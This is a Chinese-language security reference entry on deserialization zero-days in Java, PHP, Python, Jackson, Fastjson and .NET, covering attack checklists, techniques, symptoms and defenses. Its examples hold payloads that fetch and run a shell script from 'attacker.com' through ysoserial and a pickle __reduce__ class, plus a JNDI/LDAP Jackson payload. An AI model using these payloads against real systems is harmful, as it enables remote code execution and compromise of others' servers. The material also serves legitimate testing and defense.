# Web Deserialization 0day

**ID**: `web-deser-0day` | **分类**: web | **风险等级**: critical

不安全的反序列化是 OWASP Top 10 中的高危漏洞类别，允许攻击者通过构造恶意序列化数据在反序列化过程中触发对象创建、方法调用和代码执行。反序列化 0day 的核心在于发现新的 gadget chain——一系列可以串联调用的类和方法，最终导致远程代码执行 (RCE)。Java 反序列化是最著名的领域，ysoserial 提供了经典的 CommonsCollections 利用链，但随着 JDK 安全加固，旧链逐渐失效，需要挖掘新的 gadget chain。PHP unserialize() 的 POP chain 同样在持续演进。Python 的 pickle 模块本质不安全，任何反序列化操作都应避免处理不可信数据。现代反序列化 0day 通常涉及：框架级 gadget chain（如 Spring Framework、Jackson 的新利用链）、库版本差异导致的绕过（如 Fastjson 的 autoType 绕过）、以及混合攻击向量（反序列化 + JNDI + LDAP/RMI 的组合利用）。

## 触发场景

- 目标使用最新版本的序列化库，存在未公开的 gadget chain
- 应用通过 Cookie、Session 或 API 请求体接收序列化的对象数据
- Java 应用使用 ObjectInputStream.readObject() 反序列化用户可控数据
- PHP 应用使用 unserialize() 处理用户输入
- Python 应用使用 pickle.loads() 或 yaml.load() 反序列化不可信数据
- 发现序列化格式但已知 gadget chain 已被厂商补丁修复，需要寻找新的利用链

## 操作检查清单

1. 识别目标使用的序列化格式（Java/PHP/Python/Node.js/.NET）和具体库版本
2. 定位反序列化入口点：HTTP 请求体、Cookie、Session、消息队列、缓存、文件上传
3. 分析目标应用的 classpath/依赖库，确认 gadget chain 所需的类是否存在
4. 使用 ysoserial/phpggc 等工具生成已知 gadget chain 的 payload 进行初步测试
5. 如果已知 chain 被修复，分析补丁差异寻找绕过方式或新型 gadget chain
6. 对于 Jackson/Fastjson 等 JSON 反序列化，测试 @type/@class 字段和 autoType 绕过
7. 混合利用：结合 JNDI 注入、LDAP/RMI 服务器、远程 Class 加载构建完整利用链
8. 使用 CodeQL 或 gadgetinspector 对目标库源码进行静态分析，发现新的 gadget chain
9. 验证 RCE 是否成功：使用 DNS 外带（dnslog.cn）或 HTTP 回调确认命令执行

## 技术手段

- Java readObject gadget chain：利用 ObjectInputStream.readObject() 触发的方法调用链执行 RCE
- PHP POP chain：利用 __wakeup()、__destruct()、__toString() 等魔术方法链构造利用
- Python pickle __reduce__：构造包含 os.system 调用的 __reduce__ 方法实现 RCE
- Jackson @type 反序列化：通过 JSON 中的 @type 字段指定任意类进行反序列化
- Fastjson autoType 绕过：利用 L 前缀、[[ 数组嵌套、$ref 引用等绕过 autoType 限制
- JNDI 注入组合利用：反序列化触发 JNDI 查找 → LDAP 服务器返回恶意 Reference → 加载远程 Class
- XStream XML 反序列化：通过 XML 标签指定任意 Java 类进行反序列化
- .NET BinaryFormatter 反序列化：利用 TypeConfuseDelegate 等 gadget chain 实现 RCE

## 症状

- 应用接收 Base64 编码的序列化对象数据（Java、.NET）并直接反序列化
- Cookie 中包含序列化的 PHP 对象（以 "O:" 开头）或 Java 序列化数据（以 "rO0AB" 开头）
- JSON 请求体中包含 @type、@class、_type 等类型标识字段，指示服务端进行类型推断反序列化
- XML 请求体中包含自定义对象标签（XStream、.NET DataContractSerializer）
- 应用错误响应暴露了反序列化异常信息（ClassNotFoundException、InvalidClassException）
- 应用使用了已知存在反序列化风险的库（CommonsCollections、XStream、Kryo、Fastjson）

## 根因分析

- 服务端直接反序列化用户可控的数据源（HTTP 请求体、Cookie、Session），未做任何类型校验或过滤
- Java ObjectInputStream 的 resolveClass() 方法未做白名单过滤，允许任意类被实例化
- PHP unserialize() 允许指定任意类名和属性，攻击者可以构造包含恶意 __wakeup()、__destruct() 方法的对象
- Python pickle 模块的 __reduce__ 方法允许指定任意构造函数和参数，可直接执行系统命令
- Jackson 的 enableDefaultTyping 或 @JsonTypeInfo 注解允许 JSON 中的 @type 字段指定反序列化类
- Fastjson 的 autoType 功能在特定版本中存在绕过机制（如 L 前缀、[[ 数组、$ref 引用）
- .NET BinaryFormatter 和 SoapFormatter 反序列化用户可控数据，触发任意代码执行

## 示例

### Java CommonsCollections gadget chain (RCE)

利用 Apache CommonsCollections 库中的 Transformer 链，通过反序列化触发 Runtime.exec() 执行系统命令

```
原理: CommonsCollections 的 ChainedTransformer 可以串联多个 Transformer 调用
     最终调用 Runtime.getRuntime().exec() 执行系统命令
     InvokerTransformer 通过反射调用任意方法

使用 ysoserial 生成 payload:
java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/shell.sh | bash" > payload.bin

发送 payload:
POST /api/import HTTP/1.1
Content-Type: application/octet-stream
Cookie: session=rO0ABXcEAAAA... (Base64 编码的 payload)

注意: CommonsCollections 1-7 在 JDK 8u71+ 中因 AnnotationInvocationHandler 修复而失效
     需要使用更新的 gadget chain（如 CommonsBeanutils、Spring AOP、JNDI 注入）
```

### Python pickle 反序列化 RCE

利用 Python pickle 模块的 __reduce__ 方法构造恶意序列化数据，反序列化时执行任意命令

```
Python pickle 反序列化本质不安全，官方文档明确警告不要对不可信数据使用

构造恶意 pickle payload:
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("curl http://attacker.com/shell.sh | bash",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

防御: 绝不使用 pickle.loads() 处理不可信数据，使用 json 或 msgpack 替代
```

### Jackson @type 反序列化 RCE

利用 Jackson 的 @type 字段指定反序列化类，通过危险类的方法调用实现 RCE

```
前提条件: Jackson 启用了 enableDefaultTyping 或 @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)

攻击 payload:
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}

原理: JdbcRowSetImpl 的 setAutoCommit() 方法会触发 JNDI 查找
     JNDI 查找 attacker.com 的 LDAP 服务器
     LDAP 服务器返回恶意的 Reference 对象
     JNDI 加载远程 Class 并执行静态初始化块中的代码

防御: 禁用 Jackson 的 enableDefaultTyping，使用 @JsonTypeInfo(use = JsonTypeInfo.Id.NAME) 配合类型白名单
```

## 成功标志

- 成功触发 RCE，在目标系统上执行了任意命令
- 成功触发 SSRF，目标系统向攻击者控制的地址发起请求
- 成功读取目标系统敏感文件（如 /etc/passwd、web.config）
- 反序列化 payload 被目标系统接受并处理（无异常或异常中暴露了敏感信息）

## 防御建议

- Java: 避免使用 ObjectInputStream 反序列化不可信数据，使用 JSON/XML 等安全格式替代
- Java: 实施反序列化白名单（ObjectInputFilter / SerialKiller），只允许已知安全的类
- PHP: 避免使用 unserialize() 处理用户输入，使用 json_decode() 替代
- Python: 绝不使用 pickle.loads() 处理不可信数据，使用 json 或 msgpack 替代
- Python: YAML 反序列化始终使用 yaml.safe_load() 而非 yaml.load()
- Jackson: 禁用 enableDefaultTyping，使用 @JsonTypeInfo(use = JsonTypeInfo.Id.NAME) 配合类型白名单
- Fastjson: 升级到 Fastjson 2.x，或禁用 autoType
- XStream: 配置类型白名单 (XStream.denyTypes() / XStream.allowTypes())
- .NET: 避免使用 BinaryFormatter，使用 System.Text.Json 或 DataContractJsonSerializer
